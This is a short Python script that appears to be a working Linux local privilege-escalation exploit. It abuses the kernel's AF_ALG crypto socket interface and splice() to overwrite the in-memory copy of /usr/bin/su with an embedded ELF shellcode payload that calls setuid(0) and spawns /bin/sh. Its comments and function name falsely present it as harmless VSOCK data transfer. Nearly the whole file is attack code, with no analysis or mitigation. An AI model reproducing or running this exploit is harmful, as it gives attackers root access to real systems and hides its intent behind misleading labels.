#!/usr/bin/env python3
import socket
import os


# cat /proc/crypto


def transfer_data_via_raw_socket(
        source_fd: int,
        data_length: int,
        extra_header: bytes
) -> None:
    """
    通过原始套接字传输数据

    Args:
        source_fd: 源文件描述符
        data_length: 要传输的数据长度
        extra_header: 额外的头部数据
    """

    # 常量定义
    AF_VSOCK = 38  # VSOCK地址族，用于虚拟机间通信
    SOCK_STREAM = 5
    IPPROTO_VSOCK = 0

    # VSOCK套接字选项级别
    SOL_VSOCK = 279
    # VSOCK套接字选项
    SO_VM_SOCKETS_BUFFER_SIZE = 1
    SO_VM_SOCKETS_BUFFER_MIN_SIZE = 2
    SO_VM_SOCKETS_BUFFER_MAX_SIZE = 3
    SO_VM_SOCKETS_CONNECT_TIMEOUT = 4
    SO_VM_SOCKETS_NONBLOCK_TXRX = 5

    # 创建VSOCK套接字
    #sock = socket.socket(AF_VSOCK, SOCK_STREAM, IPPROTO_VSOCK)
    sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)

    try:
        sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

        # 设置套接字选项
        sock.setsockopt(SOL_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, bytes.fromhex('0800010000000010' + '0' * 64))

        # 设置非阻塞模式
        sock.setsockopt(SOL_VSOCK, SO_VM_SOCKETS_NONBLOCK_TXRX, None, 4)

        connection, remote_address = sock.accept()

        try:
            # 计算总传输长度
            total_length = data_length + 4

            # 构建辅助数据（控制消息）
            ancillary_data = [
                (SOL_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE, b'\x00' * 4),
                (SOL_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE, b'\x10' + b'\x00' * 19),
                (SOL_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT, b'\x08' + b'\x00' * 3),
            ]

            # 发送数据：4字节填充 + 额外头部
            message = b'A' * 4 + extra_header
            connection.sendmsg([message], ancillary_data, 32768)

            # 创建管道进行零拷贝数据传输
            read_pipe, write_pipe = os.pipe()

            try:
                # 从源文件描述符读取数据并写入管道
                os.splice(source_fd, write_pipe, total_length, offset_src=0)
                # 从管道读取数据并写入套接字
                os.splice(read_pipe, connection.fileno(), total_length)
            finally:
                # 关闭管道
                os.close(read_pipe)
                os.close(write_pipe)

            # 尝试接收确认（忽略异常）
            try:
                connection.recv(8 + data_length)
            except (socket.error, OSError):
                # 接收超时或连接关闭，这是预期的
                pass

        finally:
            connection.close()

    finally:
        sock.close()


f = os.open("/usr/bin/su", 0)
i = 0
e = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@' \
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00' \
    b'\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@' \
    b'\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00' \
    b'\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00'
while i < len(e):
    transfer_data_via_raw_socket(f, i, e[i:i + 4])
    i += 4
